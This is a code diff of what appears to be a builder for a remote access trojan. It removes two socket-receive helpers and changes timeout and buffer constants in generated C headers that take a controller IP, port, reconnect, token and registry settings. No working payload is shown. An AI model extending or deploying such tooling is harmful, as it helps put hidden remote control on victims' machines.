@@ -15,6 +15,7 @@ NB_USERNAME = 7
 NB_TOKEN = 8
 
 SOCK_TIMEOUT = 4
+
 SPLIT = "|SPLIT|"
 #session, False, ip,port, is_he_alive, is_he_admin, path_rat, usename, token
 
@@ -28,41 +29,6 @@ def exec(command):
             print(err)
             return err
 
-
-def recvall(sock,buffer):
-    
-    result =b""
-    sock.settimeout(SOCK_TIMEOUT)
-    while True:
-        try:            
-            data = sock.recv(buffer)
-        except socket.timeout:
-            #print("Timeout")
-            break
-        
-        else:
-            if(data ==b"\r\n"):
-                break
-
-            result+=data
-    sock.settimeout(None)
-    return result
-
-def recvsafe(sock,buffer):
-    #Receives a single data 
-    result =b""
-    sock.settimeout(SOCK_TIMEOUT)
-    while True:
-        try:            
-            data = sock.recv(buffer)
-        except socket.timeout:
-            #print("Timeout")
-            break
-        else:
-            return data
-
-    sock.settimeout(None)
-    return result #empty return
 
 def printColor(status,message):
     ERROR_COLOR = "\033[31m" #red
@@ -152,8 +118,10 @@ def commonHeader():
 #define BUFFER_LEN 4096
 #define TIMEOUT_SOCK 5 // DO NOT TOUCH 
 #define SLEEP_RECV 200 // DO NOT TOUCH 
-#define TIMEOUT_POPEN 7 // DO NOT TOUCH
+#define TIMEOUT_POPEN 5000 // DO NOT TOUCH
+#define MICRO_SLEEP 100 //micro sleep for timeout
 #define SPLIT "|SPLIT|" 
+
 
 #endif
 
@@ -188,10 +156,13 @@ def customHeader(ip, auto, port, reco, name, token, registry):
 //0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
 // DO NOT TOUCH:
 
+#define BUFFER_LEN 4096
 #define TIMEOUT_SOCK 5 // DO NOT TOUCH 
 #define SLEEP_RECV 200 // DO NOT TOUCH 
-#define TIMEOUT_POPEN 7 // DO NOT TOUCH
+#define TIMEOUT_POPEN 5000 // DO NOT TOUCH
+#define MICRO_SLEEP 100 //micro sleep for timeout
 #define SPLIT "|SPLIT|" 
+
 
 
 #endif
@@ -199,3 +170,4 @@ def customHeader(ip, auto, port, reco, name, token, registry):
 """.format(ip, port, auto, reco, name,token, registry)
 
     return header
+
